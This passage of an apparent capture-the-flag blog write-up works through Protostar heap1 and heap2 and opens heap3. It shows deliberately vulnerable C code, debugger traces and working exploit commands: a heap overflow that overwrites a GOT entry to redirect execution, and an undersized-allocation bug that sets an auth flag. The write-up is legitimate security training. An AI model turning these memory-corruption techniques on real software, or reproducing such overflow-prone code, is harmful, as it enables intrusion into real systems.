</span><span class='line'><span class="k">struct</span> <span class="n">internet</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">priority</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">winner</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;and we have a winner @ %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">internet</span> <span class="o">*</span><span class="n">i1</span><span class="p">,</span> <span class="o">*</span><span class="n">i2</span><span class="p">,</span> <span class="o">*</span><span class="n">i3</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">i1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">internet</span><span class="p">));</span>
</span><span class='line'>  <span class="n">i1</span><span class="o">-&gt;</span><span class="n">priority</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">i2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">internet</span><span class="p">));</span>
</span><span class='line'>  <span class="n">i2</span><span class="o">-&gt;</span><span class="n">priority</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'>  <span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;and that&#39;s a wrap folks!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap1 AAAA BBBB
</span><span class='line'>__libc_start_main(0x80484b9, 3, 0xbffff834, 0x8048580, 0x8048570 &lt;unfinished ...>
</span><span class='line'>malloc(8)                        = 0x0804a008
</span><span class='line'>malloc(8)                        = 0x0804a018
</span><span class='line'>malloc(8)                        = 0x0804a028
</span><span class='line'>malloc(8)                        = 0x0804a038
</span><span class='line'>strcpy(0x0804a018, "AAAA")       = 0x0804a018
</span><span class='line'>strcpy(0x0804a038, "BBBB")       = 0x0804a038
</span><span class='line'>puts("and that's a wrap folks!"and that's a wrap folks!
</span><span class='line'>)                   = 25
</span><span class='line'>+++ exited (status 25) +++</span></code></pre></td></tr></table></div></figure>


<p>We have four allocated chunks in memory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(8) 0x0804a000: i1-control
</span><span class='line'>(4) 0x0804a008: i1-priority
</span><span class='line'>(4) 0x0804a00c: i1-name(addr)
</span><span class='line'>
</span><span class='line'>(8) 0x0804a010: i1-name-control
</span><span class='line'>(8) 0x0804a018: i1-name
</span><span class='line'>
</span><span class='line'>(8) 0x0804a020: i2-control
</span><span class='line'>(4) 0x0804a028: i2-priority
</span><span class='line'>(4) 0x0804a02c: i2-name(addr)
</span><span class='line'>
</span><span class='line'>(8) 0x0804a030: i2-name-control
</span><span class='line'>(8) 0x0804a038: i2-name</span></code></pre></td></tr></table></div></figure>


<p>After 20 bytes, we are able to change <code>i2-name(addr)</code>, that is used by second <code>strcpy()</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace -e strcpy /opt/protostar/bin/heap1 $(ruby -e 'print "A" * 20 + [0x44444444].pack("V") ') 2222
</span><span class='line'>strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAADDDD")      = 0x0804a018
</span><span class='line'>strcpy(0x44444444, "2222" &lt;unfinished ...>
</span><span class='line'>--- SIGSEGV (Segmentation fault) ---
</span><span class='line'>+++ killed by SIGSEGV +++</span></code></pre></td></tr></table></div></figure>


<p>We use <code>Global Offset Table Hijacking</code> technique:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ objdump -TR /opt/protostar/bin/heap1 
</span><span class='line'>
</span><span class='line'>/opt/protostar/bin/heap1:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>DYNAMIC SYMBOL TABLE:
</span><span class='line'>00000000  w   D  *UND*    00000000              __gmon_start__
</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   __libc_start_main
</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   strcpy
</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   printf
</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   time
</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   malloc
</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   puts
</span><span class='line'>0804862c g    DO .rodata  00000004  Base        _IO_stdin_used
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE 
</span><span class='line'>0804974c R_386_GLOB_DAT    __gmon_start__
</span><span class='line'>0804975c R_386_JUMP_SLOT   __gmon_start__
</span><span class='line'>08049760 R_386_JUMP_SLOT   __libc_start_main
</span><span class='line'>08049764 R_386_JUMP_SLOT   strcpy
</span><span class='line'>08049768 R_386_JUMP_SLOT   printf
</span><span class='line'>0804976c R_386_JUMP_SLOT   time
</span><span class='line'>08049770 R_386_JUMP_SLOT   malloc
</span><span class='line'>08049774 R_386_JUMP_SLOT   puts
</span><span class='line'>
</span><span class='line'>user@protostar:~$ nm /opt/protostar/bin/heap1 | grep winner
</span><span class='line'>08048494 T winner</span></code></pre></td></tr></table></div></figure>


<p>Goal is to write the value <code>0x08048494</code> to the <code>0x08049774</code> address.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>strcpy(i1->name, argv[1]):
</span><span class='line'>(8) 0x0804a000: i1-control
</span><span class='line'>(4) 0x0804a008: i1-priority
</span><span class='line'>(4) 0x0804a00c: i1-name(addr)
</span><span class='line'>
</span><span class='line'>(8) 0x0804a010: i1-name-control
</span><span class='line'>(8) 0x0804a018: i1-name             # AAAAAAAA
</span><span class='line'>
</span><span class='line'>(8) 0x0804a020: i2-control          # AAAAAAAA
</span><span class='line'>(4) 0x0804a028: i2-priority         # AAAA
</span><span class='line'>(4) 0x0804a02c: i2-name(addr)       # [0x08049774].pack("V")
</span><span class='line'>
</span><span class='line'>(8) 0x0804a030: i2-name-control     
</span><span class='line'>(8) 0x0804a038: i2-name             
</span><span class='line'>
</span><span class='line'>strcpy(i2->name, argv[2]):
</span><span class='line'>(8) 0x0804a000: i1-control
</span><span class='line'>(4) 0x0804a008: i1-priority
</span><span class='line'>(4) 0x0804a00c: i1-name(addr)
</span><span class='line'>
</span><span class='line'>(8) 0x0804a010: i1-name-control
</span><span class='line'>(8) 0x0804a018: i1-name             # AAAAAAAA
</span><span class='line'>
</span><span class='line'>(8) 0x0804a020: i2-control          # AAAAAAAA
</span><span class='line'>(4) 0x0804a028: i2-priority         # AAAA
</span><span class='line'>(4) 0x0804a02c: i2-name(addr)       # [0x08049774].pack("V")
</span><span class='line'>
</span><span class='line'>(8) 0x0804a030: i2-name-control
</span><span class='line'>(8) 0x0804a038: i2-name             # [0x08048494].pack("V")</span></code></pre></td></tr></table></div></figure>


<p>The second <code>strcpy()</code> takes <code>i2-name(addr) = 0x08049774</code> and copies over there the <code>argv[2]</code> value.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap1 $(ruby -e 'print "A" * 20 + [0x08049774].pack("V")') $(ruby -e 'print [0x08048494].pack("V")')
</span><span class='line'>__libc_start_main(0x80484b9, 3, 0xbffff824, 0x8048580, 0x8048570 &lt;unfinished ...>
</span><span class='line'>malloc(8)                                                   = 0x0804a008
</span><span class='line'>malloc(8)                                                   = 0x0804a018
</span><span class='line'>malloc(8)                                                   = 0x0804a028
</span><span class='line'>malloc(8)                                                   = 0x0804a038
</span><span class='line'>strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAt\227\004\b")       = 0x0804a018
</span><span class='line'>strcpy(0x08049774, "\224\204\004\b")                        = 0x08049774
</span><span class='line'>puts("and that's a wrap folks!" &lt;unfinished ...>
</span><span class='line'>time(NULL)                                                  = 1435153654
</span><span class='line'>printf("and we have a winner @ %d\n", 1435153654and we have a winner @ 1435153654
</span><span class='line'>)                                                                             = 34
</span><span class='line'>&lt;... puts resumed> )                                                                                                          = 34
</span><span class='line'>+++ exited (status 34) +++</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/heap1 $(ruby -e 'print "A" * 20 + [0x08049774].pack("V")') $(ruby -e 'print [0x08048494].pack("V")')
</span><span class='line'>and we have a winner @ 1435149585</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Heap2</h2>

<figure class='code'><figcaption><span>heap2.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">auth</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">auth</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">auth</span> <span class="o">*</span><span class="n">auth</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">service</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[ auth = %p, service = %p ]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">auth</span><span class="p">,</span> <span class="n">service</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;auth &quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">auth</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span>
</span><span class='line'>          <span class="n">memset</span><span class="p">(</span><span class="n">auth</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">31</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>              <span class="n">strcpy</span><span class="p">(</span><span class="n">auth</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">line</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;reset&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">free</span><span class="p">(</span><span class="n">auth</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;service&quot;</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">service</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">7</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;login&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="n">auth</span><span class="o">-&gt;</span><span class="n">auth</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>              <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have logged in already!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>              <span class="n">printf</span><span class="p">(</span><span class="s">&quot;please enter your password</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running the binary:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/heap2 
</span><span class='line'>[ auth = (nil), service = (nil) ]
</span><span class='line'>auth 1234
</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
</span><span class='line'>service 5678
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
</span><span class='line'>login
</span><span class='line'>please enter your password
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]</span></code></pre></td></tr></table></div></figure>


<p>This is strange, the <code>service</code> variable is allocated at <code>0x0804c018</code>, but
obviously we cannot have the following heap chucks:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(08) 0x0804c000: auth-control
</span><span class='line'>(32) 0x0804c008: auth-name
</span><span class='line'>(04) 0x0804c028: auth-auth
</span><span class='line'>
</span><span class='line'>(08) 0x0804c010: service-control
</span><span class='line'>(xx) 0x0804c018: service</span></code></pre></td></tr></table></div></figure>


<p>There should be <code>sizeof(struct auth) = 32+4</code> instead of <code>sizeof(auth) = 4</code> and in
our buggy code we allocated only four bytes of memory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>auth = malloc(sizeof(auth));
</span><span class='line'>memset(auth, 0, sizeof(auth));</span></code></pre></td></tr></table></div></figure>


<p>This is very simple <code>Use-After-Free</code> vulnerability. We need to write something
to <code>auth-auth</code>, after <code>0x0804c028-0x0804c018 = 16</code> bytes.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap2
</span><span class='line'>__libc_start_main(0x8048934, 1, 0xbffff864, 0x804acc0, 0x804acb0 &lt;unfinished ...>
</span><span class='line'>printf("[ auth = %p, service = %p ]\n", (nil), (nil)[ auth = (nil), service = (nil) ]
</span><span class='line'>)                                                                         = 34
</span><span class='line'>fgets(auth A
</span><span class='line'>"auth A\n", 128, 0xb7fd8420)                                                                                            = 0xbffff730
</span><span class='line'>strncmp("auth A\n", "auth ", 5)                                                                                               = 0
</span><span class='line'>sysconf(30, 0, 0xb7fe1b28, 1, 0)                                                                                              = 4096
</span><span class='line'>sbrk(4096)                                                                                                                    = 0x0804c000
</span><span class='line'>sbrk(0)                                                                                                                       = 0x0804d000
</span><span class='line'>memset(0x0804c008, '\000', 4)                                                                                                 = 0x0804c008
</span><span class='line'>strlen("A\n")                                                                                                                 = 2
</span><span class='line'>strcpy(0x0804c008, "A\n")                                                                                                     = 0x0804c008
</span><span class='line'>strncmp("auth A\n", "reset", 5)                                                                                               = -17
</span><span class='line'>strncmp("auth A\n", "service", 6)                                                                                             = -18
</span><span class='line'>strncmp("auth A\n", "login", 5)                                                                                               = -11
</span><span class='line'>printf("[ auth = %p, service = %p ]\n", 0x804c008, (nil)[ auth = 0x804c008, service = (nil) ]
</span><span class='line'>)                                                                     = 38
</span><span class='line'>fgets(service AAAAAAAAAAAAAAA
</span><span class='line'>"service AAAAAAAAAAAAAAA\n", 128, 0xb7fd8420)                                                                           = 0xbffff730
</span><span class='line'>strncmp("service AAAAAAAAAAAAAAA\n", "auth ", 5)                                                                              = 18
</span><span class='line'>strncmp("service AAAAAAAAAAAAAAA\n", "reset", 5)                                                                              = 1
</span><span class='line'>strncmp("service AAAAAAAAAAAAAAA\n", "service", 6)                                                                            = 0
</span><span class='line'>strdup(" AAAAAAAAAAAAAAA\n")                                                                                                  = 0x0804c018
</span><span class='line'>strncmp("service AAAAAAAAAAAAAAA\n", "login", 5)                                                                              = 7
</span><span class='line'>printf("[ auth = %p, service = %p ]\n", 0x804c008, 0x804c018[ auth = 0x804c008, service = 0x804c018 ]
</span><span class='line'>)                                                                 = 42
</span><span class='line'>fgets(login
</span><span class='line'>"login\n", 128, 0xb7fd8420)                                                                                             = 0xbffff730
</span><span class='line'>strncmp("login\n", "auth ", 5)                                                                                                = 11
</span><span class='line'>strncmp("login\n", "reset", 5)                                                                                                = -6
</span><span class='line'>strncmp("login\n", "service", 6)                                                                                              = -7
</span><span class='line'>strncmp("login\n", "login", 5)                                                                                                = 0
</span><span class='line'>puts("you have logged in already!"you have logged in already!
</span><span class='line'>)                                                                                           = 28
</span><span class='line'>printf("[ auth = %p, service = %p ]\n", 0x804c008, 0x804c018[ auth = 0x804c008, service = 0x804c018 ]
</span><span class='line'>)                                                                 = 42
</span><span class='line'>fgets("login\n", 128, 0xb7fd8420)                                                                                             = NULL
</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>


<p>As we can see above, we sent 15 character + newline.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/heap2 
</span><span class='line'>[ auth = (nil), service = (nil) ]
</span><span class='line'>auth A
</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
</span><span class='line'>service AAAAAAAAAAAAAAA
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
</span><span class='line'>login
</span><span class='line'>you have logged in already!
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
</span><span class='line'>
</span><span class='line'>user@protostar:~$ ruby -e 'puts "auth A"; puts "service " + "A" * 15; puts "login"' | /opt/protostar/bin/heap2 
</span><span class='line'>[ auth = (nil), service = (nil) ]
</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
</span><span class='line'>you have logged in already!
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Heap3</h2>

<p>This level introduces old <code>Doug Lea Malloc</code> version, which is statically linked with <code>heap3</code> binary.</p>

<figure class='code'><figcaption><span>heap3.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
